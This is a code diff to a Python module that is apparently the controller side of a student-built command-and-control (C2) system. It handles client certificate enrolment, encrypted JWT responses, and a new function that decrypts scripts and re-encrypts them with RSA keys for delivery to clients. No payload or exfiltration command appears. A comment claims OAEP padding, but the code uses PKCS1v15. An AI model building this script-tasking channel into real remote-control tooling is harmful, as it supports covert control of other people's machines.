@@ -5,12 +5,14 @@ import hashlib
 import subprocess
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives.asymmetric import ec
-from cryptography.hazmat.primitives.serialization import load_pem_public_key, load_pem_private_key
+from cryptography.hazmat.primitives.serialization import load_pem_public_key, load_pem_private_key, load_der_public_key
 from cryptography.hazmat.primitives import serialization, hashes
-from cryptography.hazmat.primitives.asymmetric.utils import encode_dss_signature
 from cryptography import x509
 from cryptography.x509.oid import NameOID
 from cryptography.hazmat.backends import default_backend
+import xml.etree.ElementTree as ET
+from cryptography.hazmat.primitives.asymmetric import rsa as rsa1
+from cryptography.hazmat.primitives.asymmetric import padding as padding1
 
 # variables
 TRIGGER = 0
@@ -65,7 +67,7 @@ def constructDataResponse(data, category, key, JwT_token):
     response["1"] = encrypt_text(str(TRIGGER), key)
     response["2"] = encrypt_text(str(UPDATEINTERVAL), key)
     response["3"] = encrypt_text(category, key)
-    
+
     if category in ['OW', 'PL']:
         data_list = []
         for item in data:
@@ -76,9 +78,10 @@ def constructDataResponse(data, category, key, JwT_token):
     response["5"] = encrypt_key(key)
     response["6"] = encrypt_text(generate_uuid(), key)
     response["7"] = encrypt_text(JwT_token, key)
-    
+
     UPDATEINTERVAL = False
     return response
+
 def constructPingResponse(token, key):
     response = {}
     response["1"] = encrypt_text(str(token), key)
@@ -192,7 +195,7 @@ def get_csr(studentid):
     if not os.path.exists(STUDENT_ID_FILE):
         with open(STUDENT_ID_FILE, "w") as f:
             f.write(studentid)
-        
+
     generate_csr_and_key()
     with open(CLIENT_CSR_PATH, "rb") as f:
         csr_data = f.read().decode('utf-8')
@@ -224,10 +227,10 @@ def verify_certificate(cert_data):
     if os.path.exists(ROOT_CERT_PATH):
         with open(ROOT_CERT_PATH, "rb") as f:
             stored_cert = f.read()
-    
+
     if stored_cert is None:
         return False  # or handle the case where the certificate doesn't exist
-    
+
     return stored_cert == cert_data.encode('utf-8')
 
 # Part 3: Delete existing related keypair and cert relating to old C2
@@ -263,7 +266,7 @@ def generate_dynamic_message():
 def combine_and_encrypt(cert_data, private_key_path=CLIENT_PRIVATE_KEY_PATH):
     message = generate_dynamic_message()
     signed_message = sign_message(message, private_key_path)
-    
+
     combined_data = {
         "signed_message": signed_message,
         "cert_data": cert_data,
@@ -337,3 +340,58 @@ def decrypt_and_get_jwt_token(response_data_str, private_key_path=CLIENT_PRIVATE
     jwt_token = decrypt_jwt_token(encrypted_jwt_token, decrypted_fernet_key)
 
     return jwt_token
+
+def decrypt_and_reencrypt_script(data, fernet_key):
+    encrypted_script = data.get('encrypted_script')
+    public_key = data.get('public_key')
+
+    if not all([encrypted_script, public_key]):
+        return {"status": "error", "message": "Missing data"}, 400
+
+    encrypted_functions_script = base64.b64decode(encrypted_script)
+
+    # Decrypt the script using the provided Fernet key
+    fernet = Fernet(fernet_key)
+    decrypted_script = fernet.decrypt(encrypted_functions_script).decode('utf-8')
+
+    rsa_public_key = base64.b64decode(public_key).decode('utf-8')
+    rsa_public_key = load_rsa_public_key_from_xml(rsa_public_key)
+
+    # Define the maximum chunk size for RSA encryption with OAEP padding
+    key_size = rsa_public_key.key_size // 8
+    max_chunk_size = key_size - 11
+
+    # Encrypt the decrypted script in chunks
+    encrypted_script = encrypt_in_chunks(decrypted_script.encode('utf-8'), rsa_public_key, max_chunk_size)
+
+    return {
+        "re_encrypted_script": base64.b64encode(encrypted_script).decode('utf-8')
+    }
+
+def load_rsa_public_key_from_xml(xml_string):
+    # Parse the XML string
+    root = ET.fromstring(xml_string)
+    modulus = root.find('Modulus').text
+    exponent = root.find('Exponent').text
+
+    # Convert from Base64 to integers
+    modulus_bytes = base64.b64decode(modulus)
+    exponent_bytes = base64.b64decode(exponent)
+    modulus_int = int.from_bytes(modulus_bytes, byteorder='big')
+    exponent_int = int.from_bytes(exponent_bytes, byteorder='big')
+
+    # Create RSA public key
+    public_key = rsa1.RSAPublicNumbers(exponent_int, modulus_int).public_key(default_backend())
+
+    return public_key
+
+def encrypt_in_chunks(data, rsa_public_key, chunk_size):
+    encrypted_chunks = []
+    for i in range(0, len(data), chunk_size):
+        chunk = data[i:i + chunk_size]
+        encrypted_chunk = rsa_public_key.encrypt(
+            chunk,
+            padding1.PKCS1v15()
+        )
+        encrypted_chunks.append(encrypted_chunk)
+    return b''.join(encrypted_chunks)
